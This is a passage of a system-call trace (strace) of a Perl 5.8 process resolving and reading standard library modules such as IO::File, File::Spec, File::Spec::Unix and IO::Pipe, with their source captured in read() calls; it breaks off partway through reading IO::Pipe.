8458  07:23:31.492939 stat64("/etc/perl/IO/File.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.492972 stat64("/etc/perl/IO/File.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.492986 stat64("/usr/local/lib/perl/5.8.8/IO/File.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493000 stat64("/usr/local/lib/perl/5.8.8/IO/File.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493014 stat64("/usr/local/share/perl/5.8.8/IO/File.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493027 stat64("/usr/local/share/perl/5.8.8/IO/File.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493042 stat64("/usr/lib/perl5/IO/File.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493069 stat64("/usr/lib/perl5/IO/File.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493082 stat64("/usr/share/perl5/IO/File.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493094 stat64("/usr/share/perl5/IO/File.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493106 stat64("/usr/lib/perl/5.8/IO/File.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493119 stat64("/usr/lib/perl/5.8/IO/File.pm", {st_mode=S_IFREG|0644, st_size=1784, ...}) = 0
8458  07:23:31.493140 open("/usr/lib/perl/5.8/IO/File.pm", O_RDONLY|O_LARGEFILE) = 6
8458  07:23:31.493155 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.493166 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.493184 read(6, "#\n\npackage IO::File;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO::Seekable;\nuse File::Spec;\n\nrequire Exporter;\n\n@ISA = qw(IO::Handle IO::Seekable Exporter);\n\n$VERSION = \"1.13\";\n\n@EXPORT = @IO::Seekable::EXPORT;\n\neval {\n    # Make all Fcntl O_XXX constants available for importing\n    require Fcntl;\n    my @O = grep /^O_/, @Fcntl::EXPORT;\n    Fcntl->import(@O);  # first we import what we want to export\n    push(@EXPORT, @O);\n};\n\n################################################\n## Constructor\n##\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::File\";\n    @_ >= 0 && @_ <= 3\n\tor croak \"usage: new $class [FILENAME [,MODE [,PERMS]]]\";\n    my $fh = $class->SUPER::new();\n    if (@_) {\n\t$fh->open(@_)\n\t    or return undef;\n    }\n    $fh;\n}\n\n################################################\n## Open\n##\n\nsub open {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $fh->open(FILENAME [,MODE [,PERMS]])\';\n    my ($fh, $file) = @_;\n    if (@_ > 2) {\n\tmy ($mode, $perms) = @_[2, 3];\n\tif ($mode =~ /^\\d+$/) {\n\t    defined $perms or $perms = 0666;\n\t    return sysopen($fh, $file, $mode, $perms);\n\t} elsif ($mode =~ /:/) {\n\t    return open($fh, $mode, $file) if @_ == 3;\n\t    croak \'usage: $fh->open(FILENAME, IOLAYERS)\';\n\t}\n\tif (defined($file) && length($file)\n\t    && ! File::Spec->file_name_is_absolute($file))\n\t{\n\t    $file = File::Spec->rel2abs($file);\n\t}\n\t$file = IO::Handle::_open_mode_string($mode) . \" $file\\0\";\n    }\n    open($fh, $file);\n}\n\n################################################\n## Binmode\n##\n\nsub binmode {\n    ( @_ == 1 or @_ == 2 ) or croak \'usage $fh->binmode([LAYER])\';\n\n    my($fh, $layer) = @_;\n\n    return binmode $$fh unless $layer;\n    return binmode $$fh, $layer;\n}\n\n1;\n", 4096) = 1784
8458  07:23:31.493483 stat64("/etc/perl/File/Spec.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493500 stat64("/etc/perl/File/Spec.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493513 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493525 stat64("/usr/local/lib/perl/5.8.8/File/Spec.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493539 stat64("/usr/local/share/perl/5.8.8/File/Spec.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493552 stat64("/usr/local/share/perl/5.8.8/File/Spec.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493566 stat64("/usr/lib/perl5/File/Spec.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493577 stat64("/usr/lib/perl5/File/Spec.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493590 stat64("/usr/share/perl5/File/Spec.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493602 stat64("/usr/share/perl5/File/Spec.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493615 stat64("/usr/lib/perl/5.8/File/Spec.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493628 stat64("/usr/lib/perl/5.8/File/Spec.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493641 stat64("/usr/share/perl/5.8/File/Spec.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.493654 stat64("/usr/share/perl/5.8/File/Spec.pm", {st_mode=S_IFREG|0644, st_size=595, ...}) = 0
8458  07:23:31.493675 open("/usr/share/perl/5.8/File/Spec.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.493689 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.493701 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.493719 read(8, "package File::Spec;\n\nuse strict;\nuse vars qw(@ISA $VERSION);\n\n$VERSION = \'3.12\';\n$VERSION = eval $VERSION;\n\nmy %module = (MacOS   => \'Mac\',\n\t      MSWin32 => \'Win32\',\n\t      os2     => \'OS2\',\n\t      VMS     => \'VMS\',\n\t      epoc    => \'Epoc\',\n\t      NetWare => \'Win32\', # Yes, File::Spec::Win32 works on NetWare.\n\t      symbian => \'Win32\', # Yes, File::Spec::Win32 works on symbian.\n\t      dos     => \'OS2\',   # Yes, File::Spec::OS2 works on DJGPP.\n\t      cygwin  => \'Cygwin\');\n\nmy $module = $module{$^O} || \'Unix\';\n\nrequire \"File/Spec/$module.pm\";\n@ISA = (\"File::Spec::$module\");\n\n1;\n\n__END__\n\n", 4096) = 595
8458  07:23:31.493792 stat64("/etc/perl/vars.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.493805 stat64("/etc/perl/vars.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.493818 stat64("/usr/local/lib/perl/5.8.8/vars.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.493830 stat64("/usr/local/lib/perl/5.8.8/vars.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.493844 stat64("/usr/local/share/perl/5.8.8/vars.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.493856 stat64("/usr/local/share/perl/5.8.8/vars.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.493870 stat64("/usr/lib/perl5/vars.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.493894 stat64("/usr/lib/perl5/vars.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.493936 stat64("/usr/share/perl5/vars.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.493965 stat64("/usr/share/perl5/vars.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.493992 stat64("/usr/lib/perl/5.8/vars.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.494008 stat64("/usr/lib/perl/5.8/vars.pm", 0xbf9dbcec) = -1 ENOENT (No such file or directory)
8458  07:23:31.494021 stat64("/usr/share/perl/5.8/vars.pmc", 0xbf9dbddc) = -1 ENOENT (No such file or directory)
8458  07:23:31.494033 stat64("/usr/share/perl/5.8/vars.pm", {st_mode=S_IFREG|0644, st_size=1149, ...}) = 0
8458  07:23:31.494053 open("/usr/share/perl/5.8/vars.pm", O_RDONLY|O_LARGEFILE) = 10
8458  07:23:31.494067 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbaf8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.494078 _llseek(10, 0, [0], SEEK_CUR) = 0
8458  07:23:31.494095 read(10, "package vars;\n\nuse 5.006;\n\nour $VERSION = \'1.01\';\n\nuse warnings::register;\nuse strict qw(vars subs);\n\nsub import {\n    my $callpack = caller;\n    my ($pack, @imports) = @_;\n    my ($sym, $ch);\n    foreach (@imports) {\n        if (($ch, $sym) = /^([\\$\\@\\%\\*\\&])(.+)/) {\n\t    if ($sym =~ /\\W/) {\n\t\t# time for a more-detailed check-up\n\t\tif ($sym =~ /^\\w+[[{].*[]}]$/) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"Can\'t declare individual elements of hash or array\");\n\t\t} elsif (warnings::enabled() and length($sym) == 1 and $sym !~ tr/a-zA-Z//) {\n\t\t    warnings::warn(\"No need to declare built-in vars\");\n\t\t} elsif  (($^H &= strict::bits(\'vars\'))) {\n\t\t    require Carp;\n\t\t    Carp::croak(\"\'$_\' is not a valid variable name under strict vars\");\n\t\t}\n\t    }\n\t    $sym = \"${callpack}::$sym\" unless $sym =~ /::/;\n\t    *$sym =\n\t\t(  $ch eq \"\\$\" ? \\$$sym\n\t\t : $ch eq \"\\@\" ? \\@$sym\n\t\t : $ch eq \"\\%\" ? \\%$sym\n\t\t : $ch eq \"\\*\" ? \\*$sym\n\t\t : $ch eq \"\\&\" ? \\&$sym \n\t\t : do {\n\t\t     require Carp;\n\t\t     Carp::croak(\"\'$_\' is not a valid variable name\");\n\t\t });\n\t} else {\n\t    require Carp;\n\t    Carp::croak(\"\'$_\' is not a valid variable name\");\n\t}\n    }\n};\n\n1;\n__END__\n\n", 4096) = 1149
8458  07:23:31.494205 stat64("/etc/perl/warnings/register.pmc", 0xbf9db92c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494219 stat64("/etc/perl/warnings/register.pm", 0xbf9db83c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494232 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pmc", 0xbf9db92c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494245 stat64("/usr/local/lib/perl/5.8.8/warnings/register.pm", 0xbf9db83c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494259 stat64("/usr/local/share/perl/5.8.8/warnings/register.pmc", 0xbf9db92c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494272 stat64("/usr/local/share/perl/5.8.8/warnings/register.pm", 0xbf9db83c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494287 stat64("/usr/lib/perl5/warnings/register.pmc", 0xbf9db92c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494299 stat64("/usr/lib/perl5/warnings/register.pm", 0xbf9db83c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494312 stat64("/usr/share/perl5/warnings/register.pmc", 0xbf9db92c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494324 stat64("/usr/share/perl5/warnings/register.pm", 0xbf9db83c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494338 stat64("/usr/lib/perl/5.8/warnings/register.pmc", 0xbf9db92c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494351 stat64("/usr/lib/perl/5.8/warnings/register.pm", 0xbf9db83c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494364 stat64("/usr/share/perl/5.8/warnings/register.pmc", 0xbf9db92c) = -1 ENOENT (No such file or directory)
8458  07:23:31.494390 stat64("/usr/share/perl/5.8/warnings/register.pm", {st_mode=S_IFREG|0644, st_size=732, ...}) = 0
8458  07:23:31.494442 open("/usr/share/perl/5.8/warnings/register.pm", O_RDONLY|O_LARGEFILE) = 11
8458  07:23:31.494487 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9db648) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.494516 _llseek(11, 0, [0], SEEK_CUR) = 0
8458  07:23:31.494535 read(11, "package warnings::register;\n\nour $VERSION = \'1.01\';\n\nrequire warnings;\n\nsub mkMask\n{\n    my ($bit) = @_;\n    my $mask = \"\";\n\n    vec($mask, $bit, 1) = 1;\n    return $mask;\n}\n\nsub import\n{\n    shift;\n    my $package = (caller(0))[0];\n    if (! defined $warnings::Bits{$package}) {\n        $warnings::Bits{$package}     = mkMask($warnings::LAST_BIT);\n        vec($warnings::Bits{\'all\'}, $warnings::LAST_BIT, 1) = 1;\n        $warnings::Offsets{$package}  = $warnings::LAST_BIT ++;\n\tforeach my $k (keys %warnings::Bits) {\n\t    vec($warnings::Bits{$k}, $warnings::LAST_BIT, 1) = 0;\n\t}\n        $warnings::DeadBits{$package} = mkMask($warnings::LAST_BIT);\n        vec($warnings::DeadBits{\'all\'}, $warnings::LAST_BIT++, 1) = 1;\n    }\n}\n\n1;\n", 4096) = 732
8458  07:23:31.494696 read(11, "", 4096) = 0
8458  07:23:31.494708 close(11)         = 0
8458  07:23:31.494944 _llseek(10, 1148, [1148], SEEK_SET) = 0
8458  07:23:31.494975 _llseek(10, 0, [1148], SEEK_CUR) = 0
8458  07:23:31.494985 close(10)         = 0
8458  07:23:31.495053 _llseek(8, 594, [594], SEEK_SET) = 0
8458  07:23:31.495067 _llseek(8, 0, [594], SEEK_CUR) = 0
8458  07:23:31.495077 close(8)          = 0
8458  07:23:31.495109 stat64("/etc/perl/File/Spec/Unix.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495124 stat64("/etc/perl/File/Spec/Unix.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495138 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495151 stat64("/usr/local/lib/perl/5.8.8/File/Spec/Unix.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495165 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495178 stat64("/usr/local/share/perl/5.8.8/File/Spec/Unix.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495192 stat64("/usr/lib/perl5/File/Spec/Unix.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495204 stat64("/usr/lib/perl5/File/Spec/Unix.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495217 stat64("/usr/share/perl5/File/Spec/Unix.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495229 stat64("/usr/share/perl5/File/Spec/Unix.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495243 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495255 stat64("/usr/lib/perl/5.8/File/Spec/Unix.pm", 0xbf9dc19c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495269 stat64("/usr/share/perl/5.8/File/Spec/Unix.pmc", 0xbf9dc28c) = -1 ENOENT (No such file or directory)
8458  07:23:31.495282 stat64("/usr/share/perl/5.8/File/Spec/Unix.pm", {st_mode=S_IFREG|0644, st_size=7038, ...}) = 0
8458  07:23:31.495303 open("/usr/share/perl/5.8/File/Spec/Unix.pm", O_RDONLY|O_LARGEFILE) = 8
8458  07:23:31.495318 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dbfa8) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.495329 _llseek(8, 0, [0], SEEK_CUR) = 0
8458  07:23:31.495347 read(8, "package File::Spec::Unix;\n\nuse strict;\nuse vars qw($VERSION);\n\n$VERSION = \'1.5\';\n\nsub canonpath {\n    my ($self,$path) = @_;\n    \n    # Handle POSIX-style node names beginning with double slash (qnx, nto)\n    # Handle network path names beginning with double slash (cygwin)\n    # (POSIX says: \"a pathname that begins with two successive slashes\n    # may be interpreted in an implementation-defined manner, although\n    # more than two leading slashes shall be treated as a single slash.\")\n    my $node = \'\';\n    if ( $^O =~ m/^(?:qnx|nto|cygwin)$/ && $path =~ s:^(//[^/]+)(/|\\z):/:s ) {\n      $node = $1;\n    }\n    # This used to be\n    # $path =~ s|/+|/|g unless($^O eq \'cygwin\');\n    # but that made tests 29, 30, 35, 46, and 213 (as of #13272) to fail\n    # (Mainly because trailing \"\" directories didn\'t get stripped).\n    # Why would cygwin avoid collapsing multiple slashes into one? --jhi\n    $path =~ s|/+|/|g;                             # xx////xx  -> xx/xx\n    $path =~ s@(/\\.)+(/|\\Z(?!\\n))@/@g;             # xx/././xx -> xx/xx\n    $path =~ s|^(\\./)+||s unless $path eq \"./\";    # ./xx      -> xx\n    $path =~ s|^/(\\.\\./)+|/|;                      # /../../xx -> xx\n    $path =~ s|^/\\.\\.$|/|;                         # /..       -> /\n    $path =~ s|/\\Z(?!\\n)|| unless $path eq \"/\";          # xx/       -> xx\n    return \"$node$path\";\n}\n\nsub catdir {\n    my $self = shift;\n\n    $self->canonpath(join(\'/\', @_, \'\')); # \'\' because need a trailing \'/\'\n}\n\nsub catfile {\n    my $self = shift;\n    my $file = $self->canonpath(pop @_);\n    return $file unless @_;\n    my $dir = $self->catdir(@_);\n    $dir .= \"/\" unless substr($dir,-1) eq \"/\";\n    return $dir.$file;\n}\n\nsub curdir () { \'.\' }\n\nsub devnull () { \'/dev/null\' }\n\nsub rootdir () { \'/\' }\n\nmy $tmpdir;\nsub _tmpdir {\n    return $tmpdir if defined $tmpdir;\n    my $self = shift;\n    my @dirlist = @_;\n    {\n\tno strict \'refs\';\n\tif (${\"\\cTAINT\"}) { # Check for taint mode on perl >= 5.8.0\n            require Scalar::Util;\n\t    @dirlist = grep { ! Scalar::Util::tainted($_) } @dirlist;\n\t}\n    }\n    foreach (@dirlist) {\n\tnext unless defined && -d && -w _;\n\t$tmpdir = $_;\n\tlast;\n    }\n    $tmpdir = $self->curdir unless defined $tmpdir;\n    $tmpdir = defined $tmpdir && $self->canonpath($tmpdir);\n    return $tmpdir;\n}\n\nsub tmpdir {\n    return $tmpdir if defined $tmpdir;\n    $tmpdir = $_[0]->_tmpdir( $ENV{TMPDIR}, \"/tmp\" );\n}\n\nsub updir () { \'..\' }\n\nsub no_upwards {\n    my $self = shift;\n    return grep(!/^\\.{1,2}\\Z(?!\\n)/s, @_);\n}\n\nsub case_tolerant () { 0 }\n\nsub file_name_is_absolute {\n    my ($self,$file) = @_;\n    return scalar($file =~ m:^/:s);\n}\n\nsub path {\n    return () unless exists $ENV{PATH};\n    my @path = split(\':\', $ENV{PATH});\n    foreach (@path) { $_ = \'.\' if $_ eq \'\' }\n    return @path;\n}\n\nsub join {\n    my $self = shift;\n    return $self->catfile(@_);\n}\n\nsub splitpath {\n    my ($self,$path, $nofile) = @_;\n\n    my ($volume,$directory,$file) = (\'\',\'\',\'\');\n\n    if ( $nofile ) {\n        $directory = $path;\n    }\n    else {\n        $path =~ m|^ ( (?: .* / (?: \\.\\.?\\Z(?!\\n) )? )? ) ([^/]*) |xs;\n        $directory = $1;\n        $file      = $2;\n    }\n\n    return ($volume,$directory,$file);\n}\n\nsub splitdir {\n    return split m|/|, $_[1], -1;  # Preserve trailing fields\n}\n\nsub catpath {\n    my ($self,$volume,$directory,$file) = @_;\n\n    if ( $directory ne \'\'                && \n         $file ne \'\'                     && \n         substr( $directory, -1 ) ne \'/\' && \n         substr( $file, 0, 1 ) ne \'/\' \n    ) {\n        $directory .= \"/$file\" ;\n    }\n    else {\n        $directory .= $file ;\n    }\n\n    return $directory ;\n}\n\nsub abs2rel {\n    my($self,$path,$base) = @_;\n\n    # Figure out the effective $base and clean it up.\n    if ( !defined( $base ) || $base eq \'\' ) {\n        $base = $self->_cwd();\n    }\n    elsif ( ! $self->file_name_is_absolute( $base ) ) {\n\tif ( ! $self->file_name_is_absolute( $path ) ) {\n\t    # optimisation where both paths are relative: save 2 x cwd\n\t    $base = $self->canonpath( \"/$base\" );\n\t    $path = \"/$path\";\n\t}\n\telse {\n\t    $base = $self->rel2abs( $base ) ;\n\t}\n    }\n  ", 4096) = 4096
8458  07:23:31.496182 brk(0x8218000)    = 0x8218000
8458  07:23:31.496312 read(8, "  else {\n        $base = $self->canonpath( $base ) ;\n    }\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        $path = $self->rel2abs( $path ) ;\n    }\n    else {\n        $path = $self->canonpath( $path ) ;\n    }\n\n    # Now, remove all leading components that are the same\n    my @pathchunks = $self->splitdir( $path);\n    my @basechunks = $self->splitdir( $base);\n\n    while (@pathchunks && @basechunks && $pathchunks[0] eq $basechunks[0]) {\n        shift @pathchunks ;\n        shift @basechunks ;\n    }\n\n    $path = CORE::join( \'/\', @pathchunks );\n    $base = CORE::join( \'/\', @basechunks );\n\n    # $base now contains the directories the resulting relative path \n    # must ascend out of before it can descend to $path_directory.  So, \n    # replace all names with $parentDir\n    $base =~ s|[^/]+|..|g ;\n\n    # Glue the two together, using a separator if necessary, and preventing an\n    # empty result.\n    if ( $path ne \'\' && $base ne \'\' ) {\n        $path = \"$base/$path\" ;\n    } else {\n        $path = \"$base$path\" ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\nsub rel2abs {\n    my ($self,$path,$base ) = @_;\n\n    # Clean up $path\n    if ( ! $self->file_name_is_absolute( $path ) ) {\n        # Figure out the effective $base and clean it up.\n        if ( !defined( $base ) || $base eq \'\' ) {\n\t    $base = $self->_cwd();\n        }\n        elsif ( ! $self->file_name_is_absolute( $base ) ) {\n            $base = $self->rel2abs( $base ) ;\n        }\n        else {\n            $base = $self->canonpath( $base ) ;\n        }\n\n        # Glom them together\n        $path = $self->catdir( $base, $path ) ;\n    }\n\n    return $self->canonpath( $path ) ;\n}\n\n# Internal routine to File::Spec, no point in making this public since\n# it is the standard Cwd interface.  Most of the platform-specific\n# File::Spec subclasses use this.\nsub _cwd {\n    require Cwd;\n    Cwd::cwd();\n}\n\n# Internal method to reduce xx\\..\\yy -> yy\nsub _collapse {\n    my($fs, $path) = @_;\n\n    my $updir  = $fs->updir;\n    my $curdir = $fs->curdir;\n\n    my($vol, $dirs, $file) = $fs->splitpath($path);\n    my @dirs = $fs->splitdir($dirs);\n\n    my @collapsed;\n    foreach my $dir (@dirs) {\n        if( $dir eq $updir              and   # if we have an updir\n            @collapsed                  and   # and something to collapse\n            length $collapsed[-1]       and   # and its not the rootdir\n            $collapsed[-1] ne $updir    and   # nor another updir\n            $collapsed[-1] ne $curdir         # nor the curdir\n          ) \n        {                                     # then\n            pop @collapsed;                   # collapse\n        }\n        else {                                # else\n            push @collapsed, $dir;            # just hang onto it\n        }\n    }\n\n    return $fs->catpath($vol,\n                        $fs->catdir(@collapsed),\n                        $file\n                       );\n}\n\n1;\n", 4096) = 2942
8458  07:23:31.496768 read(8, "", 4096) = 0
8458  07:23:31.496783 close(8)          = 0
8458  07:23:31.497030 read(6, "", 4096) = 0
8458  07:23:31.497060 close(6)          = 0
8458  07:23:31.497223 stat64("/etc/perl/IO/Pipe.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497239 stat64("/etc/perl/IO/Pipe.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497253 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497266 stat64("/usr/local/lib/perl/5.8.8/IO/Pipe.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497280 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497292 stat64("/usr/local/share/perl/5.8.8/IO/Pipe.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497306 stat64("/usr/lib/perl5/IO/Pipe.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497317 stat64("/usr/lib/perl5/IO/Pipe.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497330 stat64("/usr/share/perl5/IO/Pipe.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497342 stat64("/usr/share/perl5/IO/Pipe.pm", 0xbf9dc64c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497354 stat64("/usr/lib/perl/5.8/IO/Pipe.pmc", 0xbf9dc73c) = -1 ENOENT (No such file or directory)
8458  07:23:31.497367 stat64("/usr/lib/perl/5.8/IO/Pipe.pm", {st_mode=S_IFREG|0644, st_size=3426, ...}) = 0
8458  07:23:31.497388 open("/usr/lib/perl/5.8/IO/Pipe.pm", O_RDONLY|O_LARGEFILE) = 6
8458  07:23:31.497406 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9dc458) = -1 ENOTTY (Inappropriate ioctl for device)
8458  07:23:31.497418 _llseek(6, 0, [0], SEEK_CUR) = 0
8458  07:23:31.497450 read(6, "# IO::Pipe.pm\n#\n# Copyright (c) 1996-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Pipe;\n\nuse 5.006_001;\n\nuse IO::Handle;\nuse strict;\nour($VERSION);\nuse Carp;\nuse Symbol;\n\n$VERSION = \"1.13\";\n\nsub new {\n    my $type = shift;\n    my $class = ref($type) || $type || \"IO::Pipe\";\n    @_ == 0 || @_ == 2 or croak \"usage: new $class [READFH, WRITEFH]\";\n\n    my $me = bless gensym(), $class;\n\n    my($readfh,$writefh) = @_ ? @_ : $me->handles;\n\n    pipe($readfh, $writefh)\n\tor return undef;\n\n    @{*$me} = ($readfh, $writefh);\n\n    $me;\n}\n\nsub handles {\n    @_ == 1 or croak \'usage: $pipe->handles()\';\n    (IO::Pipe::End->new(), IO::Pipe::End->new());\n}\n\nmy $do_spawn = $^O eq \'os2\' || $^O eq \'MSWin32\';\n\nsub _doit {\n    my $me = shift;\n    my $rw = shift;\n\n    my $pid = $do_spawn ? 0 : fork();\n\n    if($pid) { # Parent\n        return $pid;\n    }\n    elsif(defined $pid) { # Child or spawn\n        my $fh;\n        my $io = $rw ? \\*STDIN : \\*STDOUT;\n        my ($mode, $save) = $rw ? \"r\" : \"w\";\n        if ($do_spawn) {\n          require Fcntl;\n          $save = IO::Handle->new_from_fd($io, $mode);\n\t  my $handle = shift;\n          # Close in child:\n\t  unless ($^O eq \'MSWin32\') {\n            fcntl($handle, Fcntl::F_SETFD(), 1) or croak \"fcntl: $!\";\n\t  }\n          $fh = $rw ? ${*$me}[0] : ${*$me}[1];\n        } else {\n          shift;\n          $fh = $rw ? $me->reader() : $me->writer(); # close the other end\n        }\n        bless $io, \"IO::Handle\";\n        $io->fdopen($fh, $mode);\n\t$fh->close;\n\n        if ($do_spawn) {\n          $pid = eval { system 1, @_ }; # 1 == P_NOWAIT\n          my $err = $!;\n    \n          $io->fdopen($save, $mode);\n          $save->close or croak \"Cannot close $!\";\n          croak \"IO::Pipe: Cannot spawn-NOWAIT: $err\" if not $pid or $pid < 0;\n          return $pid;\n        } else {\n          exec @_ or\n            croak \"IO::Pipe: Cannot exec: $!\";\n        }\n    }\n    else {\n        croak \"IO::Pipe: Cannot fork: $!\";\n    }\n\n    # NOT Reached\n}\n\nsub reader {\n    @_ >= 1 or croak \'usage: $pipe->reader( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[0];\n    my $pid;\n    $pid = $me->_doit(0, $fh, @_)\n        if(@_);\n\n    close ${*$me}[1];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"r\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    $me;\n}\n\nsub writer {\n    @_ >= 1 or croak \'usage: $pipe->writer( [SUB_COMMAND_ARGS] )\';\n    my $me = shift;\n\n    return undef\n\tunless(ref($me) || ref($me = $me->new));\n\n    my $fh  = ${*$me}[1];\n    my $pid;\n    $pid = $me->_doit(1, $fh, @_)\n        if(@_);\n\n    close ${*$me}[0];\n    bless $me, ref($fh);\n    *$me = *$fh;          # Alias self to handle\n    $me->fdopen($fh->fileno,\"w\")\n\tunless defined($me->fileno);\n    bless $fh;                  # Really wan\'t un-bless here\n    ${*$me}{\'io_pipe_pid\'} = $pid\n        if defined $pid;\n\n    